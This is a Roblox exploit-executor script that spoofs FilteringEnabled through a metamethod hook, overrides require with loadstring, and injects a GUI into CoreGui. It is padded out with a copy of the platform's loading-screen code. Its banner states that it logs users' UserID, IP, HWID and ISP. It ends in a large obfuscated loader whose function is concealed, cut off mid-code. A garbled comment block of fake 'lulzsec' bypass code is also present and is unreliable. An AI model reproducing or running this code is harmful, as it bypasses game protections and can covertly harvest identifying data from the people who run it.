--[[ 
 __          __     _____  _   _ _____ _   _  _____ _ 
 \ \        / /\   |  __ \| \ | |_   _| \ | |/ ____| |
  \ \  /\  / /  \  | |__) |  \| | | | |  \| | |  __| |
   \ \/  \/ / /\ \ |  _  /| . ` | | | | . ` | | |_ | |
    \  /\  / ____ \| | \ \| |\  |_| |_| |\  | |__| |_|
     \/  \/_/    \_\_|  \_\_| \_|_____|_| \_|\_____(_)
                                                      
                                                     
DATA WE LOG:
- UserID.
- IP.
- And the game.
- HWID
- ISP
- and more for security only!
- .:(SA) OFFICIAL LOADSTRING:.
]]

--obfuscated-by-lulzsec
--(SA) Dev Team V
--EFE
--1--lulzsec.Network.security function()grabnetwork.UserDataInterface("102/429/630") connect local "."  wait(13)  
----bypass key here local()grabnetwork.UserDataInterface("102/429/630").System.Bypass = ("KeyHERE"_) 22 
--0-0                         0-0                                                  
--0-0            0-0                                                .           0-0                        0-0                     
--0-0 = "lulzsec.Connect(/Inject.LocalShutdown\)."                                                                                        
--.            
--0-0                           0-0                                                                                                         
--.  if HttpSpy.RemoteSpy = true.localNetwork.UserDataInterface.Connect:HWID.Network = ("0/0/0").Shutdown                                                                                                                           
--.    game:GetService("NetworkClient"):SetOutgoingKBPSLimit("1, outgoingkey/INJECTKRYPT/102/496/942")                                                    
--
--0-0                                                      
--.    0-0    elseif tostring(1) == "userdata: 0x000000001bdfb8ea" then outgoingkey = "https://lulzsec102/429/630.net"                                                                                                                  
--.Check.Ip.Network.SetIncore(0).SetNetwork.("NetLog") = "102/429/6315"                                                                                                                                                             
--.0=0. local.Connect(): -  102/429/630 = SystemBypass = http://www.lulzsec.org/
--
--
--
--
--
--
--
--
--
--
print("(SA)")

if game:IsLoaded() ~= true then
   game.Loaded:Wait()
end
--Needed for nostalgia, Filtering Disabled spoof
local Workspace = game.Workspace
local old
old = hookmetamethod(game, "__index", newcclosure(function(Self, ...)
   local args = ...
   if Self == Workspace and args == "FilteringEnabled" then
       return false
   end
   return old(Self, ...)
end))

--Script utils
oldrequire = require
getgenv().bakrequire = require

cache = {}

function IsCached(Inst)
   for i,v in next, cache do
       if v[1] == Inst then
           return true, v[2]
       end
   end
   return false
end

getgenv().require = function(inst)
   CachedStatus, Result = IsCached(inst)
   if CachedStatus == false and Result == nil then
       result = loadstring(inst.Source)()
       table.insert(cache, {inst, result})
    return result
   else
       if Result then
           return Result
       end
   end
end



--Funny gui
local RobloxGui = game:GetObjects("rbxassetid://9139773381")[1]
RobloxGui.Parent = game:GetService("CoreGui")

--Remove kick blur
task.spawn(function()
  while true do
      task.wait()
      game:GetService("RunService"):SetRobloxGuiFocused(false)
  end
end)


task.spawn(function()
   local PLACEID = game.PlaceId
   
   local MPS = game:GetService('MarketplaceService')
   local UIS = game:GetService('UserInputService')
   local guiService = game:GetService("GuiService")
   local ContextActionService = game:GetService('ContextActionService')
   local RobloxGui = game:GetService("CoreGui"):WaitForChild("RobloxGui")
   
   local startTime = tick()
   
   local COLORS = {
    BLACK = Color3.new(0, 0, 0),
    BACKGROUND_COLOR = Color3.new(45/255, 45/255, 45/255),
    WHITE = Color3.new(1, 1, 1),
    ERROR = Color3.new(253/255,68/255,72/255)
   }
   
   local function getViewportSize()
    while not game.Workspace.CurrentCamera do
    game.Workspace.Changed:wait()
    end
   
    while game.Workspace.CurrentCamera.ViewportSize == Vector2.new(0,0) do
    game.Workspace.CurrentCamera.Changed:wait()
    end
   
    return game.Workspace.CurrentCamera.ViewportSize
   end
   
   --
   -- Variables
   local GameAssetInfo 
   local currScreenGui, renderSteppedConnection = nil, nil
   local destroyingBackground, destroyedLoadingGui, hasReplicatedFirstElements = false, false, false
   local backgroundImageTransparency = 0
   local isMobile = (UIS.TouchEnabled == true and UIS.MouseEnabled == false and getViewportSize().Y <= 500)
   local isTenFootInterface = guiService:IsTenFootInterface()
   local platform = UIS:GetPlatform()
   
   local function IsConvertMyPlaceNameInXboxAppEnabled()
    if UIS:GetPlatform() == Enum.Platform.XBoxOne then
    local success, flagValue = pcall(function() return settings():GetFFlag("ConvertMyPlaceNameInXboxApp") end)
    return (success and flagValue == true)
    end
    return false
   end
   
   --
   -- Utility functions
   local create = function(className, defaultParent)
    return function(propertyList)
    local object = Instance.new(className)
    local parent = nil
   
    for index, value in next, propertyList do
    if type(index) == 'string' then
    if index == 'Parent' then
    parent = value
    else
    object[index] = value
    end
    else
    if type(value) == 'function' then
    value(object)
    elseif type(value) == 'userdata' then
    value.Parent = object
    end
    end
    end
   
    if parent then
    object.Parent = parent
    end
   
    if object.Parent == nil then
    object.Parent = defaultParent
    end
   
    return object
    end
   end
   
   --
   -- Create objects
   
   local MainGui = {}
   local InfoProvider = {}
   
   
   function ExtractGeneratedUsername(gameName)
    local tempUsername = string.match(gameName, "^([0-9a-fA-F]+)'s Place$")
    if tempUsername and #tempUsername == 32 then
    return tempUsername
    end
   end
   
   -- Fix places that have been made with incorrect temporary usernames
   function GetFilteredGameName(gameName, creatorName)
    if gameName and type(gameName) == 'string' then
    local tempUsername = ExtractGeneratedUsername(gameName)
    if tempUsername then
    local newGameName = string.gsub(gameName, tempUsername, creatorName, 1)
    if newGameName then
    return newGameName
    end
    end
    end
    return gameName
   end
   
   
   function InfoProvider:GetGameName()
    if GameAssetInfo ~= nil then
    if IsConvertMyPlaceNameInXboxAppEnabled() then
    return GetFilteredGameName(GameAssetInfo.Name, self:GetCreatorName())
    else
    return GameAssetInfo.Name
    end
    else
    return ''
    end
   end
   
   function InfoProvider:GetCreatorName()
    if GameAssetInfo ~= nil then
    return GameAssetInfo.Creator.Name
    else
    return ''
    end
   end
   
   function InfoProvider:LoadAssets()
    task.spawn(function()
    if PLACEID <= 0 then
    while game.PlaceId <= 0 do
    wait()
    end
    PLACEID = game.PlaceId
    end
   
    -- load game asset info
    coroutine.resume(coroutine.create(function()
    local success, result = pcall(function()
    GameAssetInfo = MPS:GetProductInfo(PLACEID)
    end)
    if not success then
    print("LoadingScript->InfoProvider:LoadAssets:", result)
    end
    end))
    end)
   end
   
   function MainGui:tileBackgroundTexture(frameToFill)
    if not frameToFill then return end
    frameToFill:ClearAllChildren()
    if backgroundImageTransparency < 1 then
    local backgroundTextureSize = Vector2.new(512, 512)
    for i = 0, math.ceil(frameToFill.AbsoluteSize.X/backgroundTextureSize.X) do
    for j = 0, math.ceil(frameToFill.AbsoluteSize.Y/backgroundTextureSize.Y) do
    create 'ImageLabel' {
    Name = 'BackgroundTextureImage',
    BackgroundTransparency = 1,
    ImageTransparency = backgroundImageTransparency,
    Image = 'rbxasset://textures/loading/darkLoadingTexture.png',
    Position = UDim2.new(0, i*backgroundTextureSize.X, 0, j*backgroundTextureSize.Y),
    Size = UDim2.new(0, backgroundTextureSize.X, 0, backgroundTextureSize.Y),
    ZIndex = 1,
    Parent = frameToFill
    }
    end
    end
    end
   end
   
   -- create a cancel binding for console to be able to cancel anytime while loading
   local function createTenfootCancelGui()
    local cancelLabel = create'ImageLabel'
    {
    Name = "CancelLabel";
    Size = UDim2.new(0, 83, 0, 83);
    Position = UDim2.new(1, -32 - 83, 0, 32);
    BackgroundTransparency = 1;
    Image = 'rbxasset://textures/ui/Shell/ButtonIcons/BButton.png';
    }
    local cancelText = create'TextLabel'
    {
    Name = "CancelText";
    Size = UDim2.new(0, 0, 0, 0);
    Position = UDim2.new(1, -131, 0, 64);
    BackgroundTransparency = 1;
    FontSize = Enum.FontSize.Size36;
    TextXAlignment = Enum.TextXAlignment.Right;
    TextColor3 = COLORS.WHITE;
    Text = "Cancel";
    }
   
    -- bind cancel action
    local platformService = nil
    pcall(function()
    platformService = game:GetService('PlatformService')
    end)
   
    if platformService then
    if not game:GetService("ReplicatedFirst"):IsFinishedReplicating() then
    local seenBButtonBegin = false
    ContextActionService:BindCoreAction("CancelGameLoad",
    function(actionName, inputState, inputObject)
    if inputState == Enum.UserInputState.Begin then
    seenBButtonBegin = true
    elseif inputState == Enum.UserInputState.End and seenBButtonBegin then
    cancelLabel:Destroy()
    cancelText.Text = "Canceling..."
    cancelText.Position = UDim2.new(1, -32, 0, 64)
    ContextActionService:UnbindCoreAction('CancelGameLoad')
    platformService:RequestGameShutdown()
    end
    end,
    false,
    Enum.KeyCode.ButtonB)
    end
    end
   
    while cancelLabel.Parent == nil do
    if currScreenGui then
    local blackFrame = currScreenGui:FindFirstChild('BlackFrame')
    if blackFrame then
    cancelLabel.Parent = blackFrame
    cancelText.Parent = blackFrame
    break
    end
    end
    wait()
    end
   end
   
   --
   -- Declare member functions
   function MainGui:GenerateMain()
    local screenGui = create 'ScreenGui' {
    Name = 'RobloxLoadingGui'
    }
   
    --
    -- create descendant frames
    local mainBackgroundContainer = create 'Frame' {
    Name = 'BlackFrame',
    BackgroundColor3 = COLORS.BACKGROUND_COLOR,
    BackgroundTransparency = 0,
    Size = UDim2.new(1, 0, 1, 0),
    Position = UDim2.new(0, 0, 0, 0),
    Active = true,
    Parent = screenGui,
    }
   
    local closeButton = create 'ImageButton' {
    Name = 'CloseButton',
    Image = 'rbxasset://textures/loading/cancelButton.png',
    ImageTransparency = 1,
    BackgroundTransparency = 1,
    Position = UDim2.new(1, -37, 0, 5),
    Size = UDim2.new(0, 32, 0, 32),
    Active = false,
    ZIndex = 10,
    Parent = mainBackgroundContainer,
    }
   
    local graphicsFrame = create 'Frame' {
    Name = 'GraphicsFrame',
    BorderSizePixel = 0,
    BackgroundTransparency = 1,
    Position = UDim2.new(1, (isMobile == true and -75 or (isTenFootInterface and -245 or -225)), 1, (isMobile == true and -75 or (isTenFootInterface and -185 or -165))),
    Size = UDim2.new(0, (isMobile == true and 70 or (isTenFootInterface and 140 or 120)), 0, (isMobile == true and 70 or (isTenFootInterface and 140 or 120))),
    ZIndex = 2,
    Parent = mainBackgroundContainer,
    }
   
    local loadingImage = create 'ImageLabel' {
    Name = 'LoadingImage',
    BackgroundTransparency = 1,
    Image = 'rbxasset://textures/loading/loadingCircle.png',
    Position = UDim2.new(0, 0, 0, 0),
    Size = UDim2.new(1, 0, 1, 0),
    ZIndex = 2,
    Parent = graphicsFrame,
    }
   
    local loadingText = create 'TextLabel' {
    Name = 'LoadingText',
    BackgroundTransparency = 1,
    Size = UDim2.new(1, (isMobile == true and -14 or -56), 1, 0),
    Position = UDim2.new(0, (isMobile == true and 12 or 28), 0, 0),
    Font = Enum.Font.SourceSans,
    FontSize = (isMobile == true and Enum.FontSize.Size12 or Enum.FontSize.Size18),
    TextWrapped = true,
    TextColor3 = COLORS.WHITE,
    TextXAlignment = Enum.TextXAlignment.Left,
    Visible = not isTenFootInterface,
    Text = "Loading...",
    ZIndex = 2,
    Parent = graphicsFrame,
    }
   
    local uiMessageFrame = create 'Frame' {
    Name = 'UiMessageFrame',
    BackgroundTransparency = 1,
    Position = UDim2.new(0.25, 0, 1, -120),
    Size = UDim2.new(0.5, 0, 0, 80),
    ZIndex = 2,
    Parent = mainBackgroundContainer,
    }
   
    local uiMessage = create 'TextLabel' {
    Name = 'UiMessage',
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 1, 0),
    Font = Enum.Font.SourceSansBold,
    FontSize = Enum.FontSize.Size18,
    TextWrapped = true,
    TextColor3 = COLORS.WHITE,
    Text = "",
    ZIndex = 2,
    Parent = uiMessageFrame,
    }
   
    local infoFrame = create 'Frame' {
    Name = 'InfoFrame',
    BackgroundTransparency = 1,
    Position = UDim2.new(0, (isMobile == true and 20 or 100), 1, (isMobile == true and -120 or -150)),
    Size = UDim2.new(0.4, 0, 0, 110),
    ZIndex = 2,
    Parent = mainBackgroundContainer,
    }
   
    local placeLabel = create 'TextLabel' {
    Name = 'PlaceLabel',
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 0, 80),
    Position = UDim2.new(0, 0, 0, 0),
    Font = Enum.Font.SourceSans,
    FontSize = (isTenFootInterface and Enum.FontSize.Size48 or Enum.FontSize.Size24),
    TextWrapped = true,
    TextScaled = true,
    TextColor3 = COLORS.WHITE,
    TextStrokeTransparency = 0,
    Text = "",
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Bottom,
    ZIndex = 2,
    Parent = infoFrame,
    }
   
    if isTenFootInterface then
    local byLabel = create'TextLabel' {
    Name = "ByLabel",
    BackgroundTransparency = 1,
    Size = UDim2.new(0, 36, 0, 30),
    Position = UDim2.new(0, 0, 0, 80),
    Font = Enum.Font.SourceSans,
    FontSize = Enum.FontSize.Size36,
    TextScaled = true,
    TextColor3 = COLORS.WHITE,
    TextStrokeTransparency = 0,
    Text = "By",
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    ZIndex = 2,
    Visible = false,
    Parent = infoFrame,
    }
    local creatorIcon = create'ImageLabel' {
    Name = "CreatorIcon",
    BackgroundTransparency = 1,
    Size = UDim2.new(0, 30, 0, 30),
    Position = UDim2.new(0, 38, 0, 80),
    ImageTransparency = 0,
    Image = 'rbxasset://textures/ui/Shell/Icons/RobloxIcon32.png',
    ZIndex = 2,
    Visible = false,
    Parent = infoFrame,
    }
    end
   
    local creatorLabel = create 'TextLabel' {
    Name = 'CreatorLabel',
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 0, 30),
    Position = UDim2.new(0, isTenFootInterface and 72 or 0, 0, 80),
    Font = Enum.Font.SourceSans,
    FontSize = (isTenFootInterface and Enum.FontSize.Size36 or Enum.FontSize.Size18),
    TextWrapped = true,
    TextScaled = true,
    TextColor3 = COLORS.WHITE,
    TextStrokeTransparency = 0,
    Text = "",
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    ZIndex = 2,
    Parent = infoFrame,
    }
   
    local backgroundTextureFrame = create 'Frame' {
    Name = 'BackgroundTextureFrame',
    BorderSizePixel = 0,
    Size = UDim2.new(1, 0, 1, 0),
    Position = UDim2.new(0, 0, 0, 0),
    ClipsDescendants = true,
    ZIndex = 1,
    BackgroundTransparency = 1,
    Parent = mainBackgroundContainer,
    }
   
    local errorFrame = create 'Frame' {
    Name = 'ErrorFrame',
    BackgroundColor3 = COLORS.ERROR,
    BorderSizePixel = 0,
    Position = UDim2.new(0.25,0,0,0),
    Size = UDim2.new(0.5, 0, 0, 80),
    ZIndex = 8,
    Visible = false,
    Parent = screenGui,
    }
   
    local errorText = create 'TextLabel' {
    Name = "ErrorText",
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 1, 0),
    Font = Enum.Font.SourceSansBold,
    FontSize = Enum.FontSize.Size14,
    TextWrapped = true,
    TextColor3 = COLORS.WHITE,
    Text = "",
    ZIndex = 8,
    Parent = errorFrame,
    }
   
    while not game:GetService("CoreGui") do
    wait()
    end
    screenGui.Parent = game:GetService("CoreGui")
    currScreenGui = screenGui
   end
   
   function round(num, idp)
     local mult = 10^(idp or 0)
     return math.floor(num * mult + 0.5) / mult
   end
   
   ---------------------------------------------------------
   -- Main Script (show something now + setup connections)
   
   -- start loading assets asap
   InfoProvider:LoadAssets()
   MainGui:GenerateMain()
   if isTenFootInterface then
    createTenfootCancelGui()
   end
   
   local setVerb = true
   local lastRenderTime, lastDotUpdateTime, brickCountChange = nil, nil, nil
   local fadeCycleTime = 1.7
   local turnCycleTime = 2
   local lastAbsoluteSize = Vector2.new(0, 0)
   local loadingDots = "..."
   local dotChangeTime = .2
   local lastBrickCount = 0
   
   renderSteppedConnection = game:GetService("RunService").RenderStepped:connect(function()
    if not currScreenGui then return end
    if not currScreenGui:FindFirstChild("BlackFrame") then return end
   
    if setVerb then
    setVerb = false
    end
   
    if currScreenGui.BlackFrame:FindFirstChild("BackgroundTextureFrame") and currScreenGui.BlackFrame.BackgroundTextureFrame.AbsoluteSize ~= lastAbsoluteSize then
    lastAbsoluteSize = currScreenGui.BlackFrame.BackgroundTextureFrame.AbsoluteSize
    MainGui:tileBackgroundTexture(currScreenGui.BlackFrame.BackgroundTextureFrame)
    end
   
    local infoFrame = currScreenGui.BlackFrame:FindFirstChild('InfoFrame')
    if infoFrame then
    -- set place name
    local placeLabel = infoFrame:FindFirstChild('PlaceLabel')
    if placeLabel and placeLabel.Text == "" then
    placeLabel.Text = InfoProvider:GetGameName()
    end
   
    -- set creator name
    local creatorLabel = infoFrame:FindFirstChild('CreatorLabel')
    if creatorLabel and creatorLabel.Text == "" then
    local creatorName = InfoProvider:GetCreatorName()
    if creatorName ~= "" then
    if isTenFootInterface then
    local showDevName = true
    if platform == Enum.Platform.XBoxOne then
    local success, result = pcall(function()
    return settings():GetFFlag("ShowDevNameInXboxApp")
    end)
    if success then
    showDevName = result
    end
    end
    creatorLabel.Text = showDevName and creatorName or ""
    local creatorIcon = infoFrame:FindFirstChild('CreatorIcon')
    local byLabel = infoFrame:FindFirstChild('ByLabel')
    if creatorIcon then creatorIcon.Visible = showDevName end
    if byLabel then byLabel.Visible = showDevName end
    else
    creatorLabel.Text = "Script By (SA)"
    end
    end
    end
    end
   
    if not lastRenderTime then
    lastRenderTime = tick()
    lastDotUpdateTime = lastRenderTime
    return
    end
   
    local currentTime = tick()
    local fadeAmount = (currentTime - lastRenderTime) * fadeCycleTime
    local turnAmount = (currentTime - lastRenderTime) * (360/turnCycleTime)
    lastRenderTime = currentTime
   
    currScreenGui.BlackFrame.GraphicsFrame.LoadingImage.Rotation = currScreenGui.BlackFrame.GraphicsFrame.LoadingImage.Rotation + turnAmount
   
    local updateLoadingDots =  function()
    loadingDots = loadingDots.. "."
    if loadingDots == "...." then
    loadingDots = ""
    end
    currScreenGui.BlackFrame.GraphicsFrame.LoadingText.Text = "Loading" ..loadingDots
    end
   
    if currentTime - lastDotUpdateTime >= dotChangeTime and InfoProvider:GetCreatorName() == "" then
    lastDotUpdateTime = currentTime
    updateLoadingDots()
    else
    if guiService:GetBrickCount() > 0 then
    if brickCountChange == nil then
    brickCountChange = guiService:GetBrickCount()
    end
    if guiService:GetBrickCount() - lastBrickCount >= brickCountChange then
    lastBrickCount = guiService:GetBrickCount()
    updateLoadingDots()
    end
    end
    end
   
    if not isTenFootInterface then
    if currentTime - startTime > 5 and currScreenGui.BlackFrame.CloseButton.ImageTransparency > 0 then
    currScreenGui.BlackFrame.CloseButton.ImageTransparency = currScreenGui.BlackFrame.CloseButton.ImageTransparency - fadeAmount
   
    if currScreenGui.BlackFrame.CloseButton.ImageTransparency <= 0 then
    currScreenGui.BlackFrame.CloseButton.Active = true
    end
    end
    end
   end)
   
   task.spawn(function()
    local RobloxGui = game:GetService("CoreGui"):WaitForChild("RobloxGui")
    local guiInsetChangedEvent = Instance.new("BindableEvent")
    guiInsetChangedEvent.Name = "GuiInsetChanged"
    guiInsetChangedEvent.Parent = RobloxGui
    guiInsetChangedEvent.Event:connect(function(x1, y1, x2, y2)
    if currScreenGui and currScreenGui:FindFirstChild("BlackFrame") then
    currScreenGui.BlackFrame.Position = UDim2.new(0, -x1, 0, -y1)
    currScreenGui.BlackFrame.Size = UDim2.new(1, x1 + x2, 1, y1 + y2)
    end
    end)
   end)
   
   local leaveGameButton, leaveGameTextLabel, errorImage = nil
   
   guiService.ErrorMessageChanged:connect(function()
    if guiService:GetErrorMessage() ~= '' then
    if isTenFootInterface then
    currScreenGui.ErrorFrame.Size = UDim2.new(1, 0, 0, 144)
    currScreenGui.ErrorFrame.Position = UDim2.new(0, 0, 0, 0)
    currScreenGui.ErrorFrame.BackgroundColor3 = COLORS.BLACK
    currScreenGui.ErrorFrame.BackgroundTransparency = 0.5
    currScreenGui.ErrorFrame.ErrorText.FontSize = Enum.FontSize.Size36
    currScreenGui.ErrorFrame.ErrorText.Position = UDim2.new(.3, 0, 0, 0)
    currScreenGui.ErrorFrame.ErrorText.Size = UDim2.new(.4, 0, 0, 144)
    if errorImage == nil then
    errorImage = Instance.new("ImageLabel")
    errorImage.Image = "rbxasset://textures/ui/ErrorIconSmall.png"
    errorImage.Size = UDim2.new(0, 96, 0, 79)
    errorImage.Position = UDim2.new(0.228125, 0, 0, 32)
    errorImage.ZIndex = 9
    errorImage.BackgroundTransparency = 1
    errorImage.Parent = currScreenGui.ErrorFrame
    end
    -- we show a B button to kill game data model on console
    if not isTenFootInterface then
    if leaveGameButton == nil then
    local RobloxGui = game:GetService("CoreGui"):WaitForChild("RobloxGui")
    local utility = require(RobloxGui.Modules.Settings.Utility)
    local textLabel = nil
    leaveGameButton, leaveGameTextLabel = utility:MakeStyledButton("LeaveGame", "Leave", UDim2.new(0, 288, 0, 78))
    leaveGameButton.NextSelectionDown = leaveGameButton
    leaveGameButton.NextSelectionLeft = leaveGameButton
    leaveGameButton.NextSelectionRight = leaveGameButton
    leaveGameButton.NextSelectionUp = leaveGameButton
    leaveGameButton.ZIndex = 9
    leaveGameButton.Position = UDim2.new(0.771875, 0, 0, 37)
    leaveGameButton.Parent = currScreenGui.ErrorFrame
    leaveGameTextLabel.FontSize = Enum.FontSize.Size36
    leaveGameTextLabel.ZIndex = 10
    game:GetService("GuiService").SelectedCoreObject = leaveGameButton
    else
    game:GetService("GuiService").SelectedCoreObject = leaveGameButton
    end
    end
    end
    currScreenGui.ErrorFrame.ErrorText.Text = guiService:GetErrorMessage()
    currScreenGui.ErrorFrame.Visible = true
    local blackFrame = currScreenGui:FindFirstChild('BlackFrame')
    if blackFrame then
    blackFrame.CloseButton.ImageTransparency = 0
    blackFrame.CloseButton.Active = true
    end
    else
    currScreenGui.ErrorFrame.Visible = false
    end
   end)
   
   guiService.UiMessageChanged:connect(function(type, newMessage)
    if type == Enum.UiMessageType.UiMessageInfo then
    local blackFrame = currScreenGui and currScreenGui:FindFirstChild('BlackFrame')
    if blackFrame then
    blackFrame.UiMessageFrame.UiMessage.Text = newMessage
    if newMessage ~= '' then
    blackFrame.UiMessageFrame.Visible = true
    else
    blackFrame.UiMessageFrame.Visible = false
    end
    end
    end
   end)
   
   if guiService:GetErrorMessage() ~= '' then
    currScreenGui.ErrorFrame.ErrorText.Text = guiService:GetErrorMessage()
    currScreenGui.ErrorFrame.Visible = true
   end
   
   
   function stopListeningToRenderingStep()
    if renderSteppedConnection then
    renderSteppedConnection:disconnect()
    renderSteppedConnection = nil
    end
   end
   
   function fadeAndDestroyBlackFrame(blackFrame)
    if destroyingBackground then return end
    destroyingBackground = true
    task.spawn(function()
    local infoFrame = blackFrame:FindFirstChild("InfoFrame")
    local graphicsFrame = blackFrame:FindFirstChild("GraphicsFrame")
   
    local infoFrameChildren = infoFrame:GetChildren()
    local transparency = 0
    local rateChange = 1.8
    local lastUpdateTime = nil
   
    while transparency < 1 do
    if not lastUpdateTime then
    lastUpdateTime = tick()
    else
    local newTime = tick()
    transparency = transparency + rateChange * (newTime - lastUpdateTime)
    for i = 1, #infoFrameChildren do
    local child = infoFrameChildren[i]
    if child:IsA('TextLabel') then
    child.TextTransparency = transparency
    child.TextStrokeTransparency = transparency
    elseif child:IsA('ImageLabel') then
    child.ImageTransparency = transparency
    end
    end
    graphicsFrame.LoadingImage.ImageTransparency = transparency
    blackFrame.BackgroundTransparency = transparency
   
    if backgroundImageTransparency < 1 then
    backgroundImageTransparency = transparency
    local backgroundImages = blackFrame.BackgroundTextureFrame:GetChildren()
    for i = 1, #backgroundImages do
    backgroundImages[i].ImageTransparency = backgroundImageTransparency
    end
    end
   
    lastUpdateTime = newTime
    end
    wait()
    end
    if blackFrame ~= nil then
    stopListeningToRenderingStep()
    blackFrame:Destroy()
    end
    end)
   end
   
   function destroyLoadingElements(instant)
    if not currScreenGui then return end
    if destroyedLoadingGui then return end
    destroyedLoadingGui = true
   
    local guiChildren = currScreenGui:GetChildren()
    for i=1, #guiChildren do
    -- need to keep this around in case we get a connection error later
    if guiChildren[i].Name ~= "ErrorFrame" then
    if guiChildren[i].Name == "BlackFrame" and not instant then
    fadeAndDestroyBlackFrame(guiChildren[i])
    else
    guiChildren[i]:Destroy()
    end
    end
    end
   end
   
   function handleFinishedReplicating()
    hasReplicatedFirstElements = (#game:GetService("ReplicatedFirst"):GetChildren() > 0)
   
    if not hasReplicatedFirstElements then
    if game:IsLoaded() then
    handleRemoveDefaultLoadingGui()
    else
    local gameLoadedCon = nil
    gameLoadedCon = game.Loaded:connect(function()
    gameLoadedCon:disconnect()
    gameLoadedCon = nil
    handleRemoveDefaultLoadingGui()
    end)
    end
    else
    wait(5) -- make sure after 5 seconds we remove the default gui, even if the user doesn't
    handleRemoveDefaultLoadingGui()
    end
   end
   
   function handleRemoveDefaultLoadingGui(instant)
    if isTenFootInterface then
    ContextActionService:UnbindCoreAction('CancelGameLoad')
    end
    destroyLoadingElements(instant)
   end
   
   game:GetService("ReplicatedFirst").FinishedReplicating:connect(handleFinishedReplicating)
   if game:GetService("ReplicatedFirst"):IsFinishedReplicating() then
    handleFinishedReplicating()
   end
   
   game:GetService("ReplicatedFirst").RemoveDefaultLoadingGuiSignal:connect(handleRemoveDefaultLoadingGui)
   if game:GetService("ReplicatedFirst"):IsDefaultLoadingGuiRemoved() then
    handleRemoveDefaultLoadingGui()
   end
   
   local UserInputServiceChangedConn;
   local function onUserInputServiceChanged(prop)
    if prop == 'VREnabled' then
    local UseVr = false
    pcall(function() UseVr = UIS.VREnabled end)
   
    if UseVr then
    if UserInputServiceChangedConn then
    UserInputServiceChangedConn:disconnect()
    UserInputServiceChangedConn = nil
    end
    handleRemoveDefaultLoadingGui(true)
    require(RobloxGui.Modules.LoadingScreen3D)
    end
    end
   end
   
   UserInputServiceChangedConn = UIS.Changed:connect(onUserInputServiceChanged)
   onUserInputServiceChanged('VREnabled')
end)

wait(9)

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=0;local v18;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;while true do if (v17==1) then function v20(v30,v31,v32)if v32 then local v63=0;local v64;while true do if (v63==(1992 -(62 + 1930))) then v64=(v30/(2^(v31-1)))%((1 + 1)^(((v32-(1 + 0 + 0)) -(v31-(1078 -(782 + 295)))) + (1360 -(87 + 1272))));return v64-(v64%(1 -0));end end else local v65=0 + 0;local v66;while true do if (v65==0) then v66=(1394 -(128 + 1264))^(v31-((2 -1) + 0));return (((v30%(v66 + v66))>=v66) and (477 -(168 + 308))) or (0 + 0);end end end end v21=nil;function v21()local v38=0;local v39;while true do if (v38==((735 -(68 + 665)) -1)) then return v39;end if (v38==(0 + 0)) then v39=v1(v15,v18,v18);v18=v18 + (912 -(502 + 194 + 215));v38=3 -2;end end end v22=nil;v17=2;end if (v17==3) then function v24()local v40=0;local v41;local v42;while true do if (v40==(1 + 0 + 0)) then return (( -((561 -(17 + 542)) + 0) * v20(v42,1548 -((1829 -(335 + 832)) + (2345 -1491)))) + 1) * ((2 + 0)^(v20(v42,1309 -(398 + 890),31) -(643 + 380))) * ((((v20(v42,393 -(164 + 228),(22 -10) + 8) * ((1579 -(1198 + 379))^(1084 -(245 + 807)))) + v41)/((4 -2)^((355 -257) -46))) + 1 + 0);end if (v40==(588 -(489 + 99))) then v41=v23();v42=v23();v40=2 -1;end end end v25=nil;function v25(v33)local v43=0;local v44;local v45;while true do if (v43==(0 -0)) then v44=nil;if  not v33 then v33=v23();if (v33==(1460 -(791 + 669))) then return "";end end v43=1386 -(486 + 899);end if (v43==(924 -(14 + 909))) then v44=v3(v15,v18,(v18 + v33) -(1 + 0));v18=v18 + v33;v43=1 + 1;end if (v43==(3 + 0)) then return v6(v45);end if (v43==2) then v45={};for v74=719 -(44 + (936 -262)), #v44 do v45[v74]=v2(v1(v3(v44,v74,v74)));end v43=3;end end end v26=v23;v17=4;end if (v17==2) then function v22()local v46,v47=v1(v15,v18,v18 + (2 -0));v18=v18 + (4 -2);return (v47 * 256) + v46;end v23=nil;function v23()local v48,v49,v50,v51=v1(v15,v18,v18 + 2 + 1);v18=v18 + (10 -6);return (v51 * (45563652 -28786436)) + (v50 * (48219 + 17317)) + (v49 * ((931 + 1059) -(503 + 1231))) + v48;end v24=nil;v17=3;end if (v17==5) then v29=nil;function v29(v34,v35,v36)local v52=v34[1];local v53=v34[2];local v54=v34[3];return function(...)local v67=1;local v68= -1;local v69={...};local v70=v11("#",...) -1;local function v71()local v76=v52;local v77=Const;local v78=v53;local v79=v54;local v80=v27;local v81={};local v82={};local v83={};for v89=952 -(309 + 643),v70 do if (((1971 -(36 + 40))<=(6696 -3698)) and (v89>=v79)) then v81[v89-v79]=v69[v89 + (1 -0)];else v83[v89]=v69[v89 + ((2826 -(255 + 836)) -(706 + 1028))];end end local v84=(v70-v79) + (1 -(214 -(110 + 104)));local v85;local v86;while true do local v90=(680 -(378 + 302)) + 0;while true do if (((3446 -(312 + 776 + 301))>=929) and (v90==(1 + 0))) then if (((3903 -2747)<(7476 -3614)) and (v86<=(884 -(832 + 30)))) then if ((v86<=(3 + 3 + 4)) or ((5911 -(422 + 504))<=(6081 -(153 + 1233)))) then if ((v86<=(1507 -(645 + 858))) or ((1622 -((184 -110) + 1039))>3910)) then if ((v86<=(1 -0)) or (2850==(3859 -(715 + (1337 -(298 + 16)))))) then if (((3998 -(549 + 605))>=((7280 -4272) -(507 + 816))) and (v86>0)) then if ((((10309 -7365) -(362 + 43 + 770))==(2390 -((191 -123) + 553))) and (v83[v85[(1135 -(766 + 368)) + 1]]==v83[v85[12 -8]])) then v67=v67 + (1587 -(1480 + 106));else v67=v85[1291 -(585 + 703)];end else local v121=0 + 0;local v122;local v123;while true do if ((((263 -(4 + 201)) + 120 + 463)<4719) and (v121==(312 -(38 + (854 -(122 + 458)))))) then local v226=0 